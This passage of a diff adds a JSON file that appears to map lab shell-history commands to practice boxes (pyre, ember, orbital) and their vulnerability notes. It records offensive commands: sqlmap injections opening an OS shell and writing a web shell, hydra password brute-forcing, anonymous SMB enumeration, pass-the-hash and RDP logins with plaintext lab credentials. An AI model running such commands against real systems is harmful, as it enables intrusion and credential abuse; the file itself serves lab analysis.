+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --os-shell\"",
+          "timestamp": "2026-02-03T19:43:27"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-03T19:44:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 963,
+          "command": "ssh root@10.100.7.45",
+          "timestamp": "2026-02-03T19:44:14"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 269,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --file-write=\"shell.py\" --file-dest=\"/var/www/html/shell.py\"\"",
+          "timestamp": "2026-02-03T19:44:00"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 270,
+          "command": "sqlmap -u 10.100.7.45/panels.php\" --file-write=\"shell.py\" --file-dest=\"/var/www/html/shell.py\"\"",
+          "timestamp": "2026-02-03T19:44:16"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 271,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --file-write=\"shell.py\" --file-dest=\"/var/www/html/shell.py\"\"",
+          "timestamp": "2026-02-03T19:44:27"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 272,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --os-shell\"",
+          "timestamp": "2026-02-03T19:44:53"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-26T19:11:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 239,
+          "command": "nmap 10.100.7.46",
+          "timestamp": "2026-01-26T19:11:15"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 240,
+          "command": "nxc smb 10.100.7.46 -u guest -p ' '",
+          "timestamp": "2026-01-26T19:11:48"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 125,
+          "command": "smbclient -L //10.100.7.46 -U \u201c\u201d",
+          "timestamp": "2026-01-26T19:11:41"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 126,
+          "command": "smbclient //10.100.7.46/C -U \u201c\u201d",
+          "timestamp": "2026-01-26T19:11:58"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-26T19:12:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 241,
+          "command": "nxc smb 10.100.7.46",
+          "timestamp": "2026-01-26T19:12:03"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 127,
+          "command": "smbclient //10.100.7.46/Scripts -U \u201c\u201d",
+          "timestamp": "2026-01-26T19:12:51"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-26T19:27:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 243,
+          "command": "nxc smb 10.100.7.46 -u guest -p 'fdfdasdf'",
+          "timestamp": "2026-01-26T19:27:19"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 244,
+          "command": "nxc smb 10.100.7.46 -u ''  -p ''",
+          "timestamp": "2026-01-26T19:27:52"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 161,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4",
+          "timestamp": "2026-01-26T19:27:40"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 162,
+          "command": "nxc smb 10.100.7.46 -u rand -p dFMVxYA4D! --local-auth",
+          "timestamp": "2026-01-26T19:27:46"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-26T19:29:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 246,
+          "command": "nxc smb 10.100.7.46 -u guest  -p '' --shares",
+          "timestamp": "2026-01-26T19:29:09"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 165,
+          "command": "nxc smb 10.100.7.46 -u rand -p dFMVxYA4D! --local-auth",
+          "timestamp": "2026-01-26T19:29:45"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 166,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4",
+          "timestamp": "2026-01-26T19:29:51"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-26T19:30:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 247,
+          "command": "smbclient //10.100.7.46/Scripts --user guest",
+          "timestamp": "2026-01-26T19:30:48"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 167,
+          "command": "nmap -sV -p- -T3 10.100.7.46",
+          "timestamp": "2026-01-26T19:30:30"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T18:54:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 239,
+          "command": "smbclient //10.100.7.46/Scripts -U \u201c\u201d",
+          "timestamp": "2026-01-27T18:54:21"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 40,
+          "command": "nxc smb 10.100.7.46 -u EMBER$ -p J4f9juEr -M change-password -o NEWPASS=RandomTextPlease",
+          "timestamp": "2026-01-27T18:54:36"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T18:57:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 299,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T18:57:44"
+        },
+        {
+          "log_file": "logs/10.100.7.22/shell_history.csv",
+          "line": 180,
+          "command": "scp hey.txt ember@10.100.7.46:/home/user",
+          "timestamp": "2026-01-27T18:57:13"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 244,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T18:57:52"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T18:58:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 300,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T18:58:00"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 301,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T18:58:29"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 302,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T18:58:43"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 303,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T18:58:53"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 245,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T18:58:12"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 246,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T18:58:39"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 247,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T18:58:48"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 248,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T18:58:59"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-12T19:32:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 30,
+          "command": "nmap -sV -p 1-65535 -T3 10.100.7.42",
+          "timestamp": "2026-01-12T19:32:56"
+        },
+        {
+          "log_file": "logs/10.100.7.22/shell_history.csv",
+          "line": 37,
+          "command": "xfreerdp3 /u:Administrator /v:10.100.7.42 /p:$HEX[330a]",
+          "timestamp": "2026-01-12T19:32:19"
+        },
+        {
+          "log_file": "logs/10.100.7.22/shell_history.csv",
+          "line": 38,
+          "command": "xfreerdp3 /u:orbital /v:10.100.7.42 /p:abc123",
+          "timestamp": "2026-01-12T19:32:41"
+        },
+        {
+          "log_file": "logs/10.100.7.22/shell_history.csv",
+          "line": 39,
+          "command": "xfreerdp3 /u:orbital /v:10.100.7.42 /p:qwert",
+          "timestamp": "2026-01-12T19:32:45"
+        },
+        {
+          "log_file": "logs/10.100.7.22/shell_history.csv",
+          "line": 40,
+          "command": "xfreerdp3 /u:orbital /v:10.100.7.42 /p:qwerty",
+          "timestamp": "2026-01-12T19:32:48"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-12T19:48:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 33,
+          "command": "hydra -l administrator -P /usr/share/wordlists/rockyou.txt ssh://10.100.7.42",
+          "timestamp": "2026-01-12T19:48:47"
+        },
+        {
+          "log_file": "logs/10.100.7.22/shell_history.csv",
+          "line": 42,
+          "command": "xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword",
+          "timestamp": "2026-01-12T19:48:42"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-26T19:33:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 172,
+          "command": "smbclient -L //10.100.7.46 -U \u201c\u201d",
+          "timestamp": "2026-01-26T19:33:06"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 173,
+          "command": "smbclient -L //10.100.7.46 -U \u201c\u201d",
+          "timestamp": "2026-01-26T19:33:10"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 174,
+          "command": "smbclient //10.100.7.46/Scripts -U \u201c\u201d",
+          "timestamp": "2026-01-26T19:33:27"
+        },
+        {
+          "log_file": "logs/10.100.7.31/shell_history.csv",
+          "line": 18,
+          "command": "nxc smb 10.100.7.46 -u ember -p passwrod",
+          "timestamp": "2026-01-26T19:33:59"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-26T19:42:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 195,
+          "command": "xfreerdp3 /u:rand2 /v:10.100.7.46 /p:dFMVxYA4",
+          "timestamp": "2026-01-26T19:42:39"
+        },
+        {
+          "log_file": "logs/10.100.7.31/shell_history.csv",
+          "line": 25,
+          "command": "enum4linux -a -u ember -p password 10.100.7.46",
+          "timestamp": "2026-01-26T19:42:01"
+        },
+        {
+          "log_file": "logs/10.100.7.31/shell_history.csv",
+          "line": 26,
+          "command": "enum4linux -a -u Adminsitrator -p password 10.100.7.46",
+          "timestamp": "2026-01-26T19:42:20"
+        },
+        {
+          "log_file": "logs/10.100.7.31/shell_history.csv",
+          "line": 28,
+          "command": "enum4linux -a -u Adminsitrator -p password 10.100.7.46",
+          "timestamp": "2026-01-26T19:42:37"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T20:28:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 248,
+          "command": "ftp ember 10.100.7.46",
+          "timestamp": "2026-01-27T20:28:23"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 298,
+          "command": "nxc smb 10.100.7.46 -u Administrator -p 781a57928a384400acf7976192ea685a",
+          "timestamp": "2026-01-27T20:28:26"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 299,
+          "command": "nxc smb 10.100.7.46 -u Administrator -H 781a57928a384400acf7976192ea685a",
+          "timestamp": "2026-01-27T20:28:37"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 300,
+          "command": "nxc smb 10.100.7.46 -u Administrator -H 781a57928a384400acf7976192ea685a",
+          "timestamp": "2026-01-27T20:28:58"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    }
+  ]
+}
